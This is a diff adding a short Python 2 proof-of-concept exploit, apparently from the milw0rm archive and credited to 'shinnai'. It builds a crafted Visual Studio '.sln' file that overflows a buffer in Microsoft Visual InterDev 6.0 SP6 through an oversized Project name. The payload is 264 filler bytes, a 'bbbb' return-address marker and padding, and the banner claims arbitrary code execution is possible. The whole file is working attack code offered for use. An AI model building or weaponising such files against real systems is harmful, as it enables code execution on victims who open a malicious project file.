@@ -1,0 +1,31 @@
+#usage: exploit.py FileName
+
+import sys
+
+print "--------------------------------------------------------------------------------"
+print ' [PoC 2] Microsoft Visual InterDev 6.0 (SP6) ".sln" files Local Buffer Overflow'
+print " author: shinnai"
+print " mail: shinnai[at]autistici[dot]org"
+print " site: http://shinnai.altervista.org\n"
+print " Execution of arbitrary code is possible, but it annoys me at the moment :)"
+print "--------------------------------------------------------------------------------"
+
+buff      = "a" * 264 + "bbbb" + "c" * 256
+
+try:
+    sln_file = \
+        'Microsoft Visual Studio Solution File, Format Version 1.00\n'+\
+        'Project("{}") = "' + buff + '"\n'+\ 
+        'EndProject\n'
+    
+    out_file = open(sys.argv[1] + ".sln",'w')
+    out_file.write(sln_file)
+    out_file.close()
+    print "\nFILE CREATION COMPLETED!\n"
+except:
+    print " \n -------------------------------------"
+    print "  Usage: exploit.py FileName"
+    print " -------------------------------------"
+    print "\nAN ERROR OCCURS DURING FILE CREATION!"
+
+# milw0rm.com [2008-04-03]
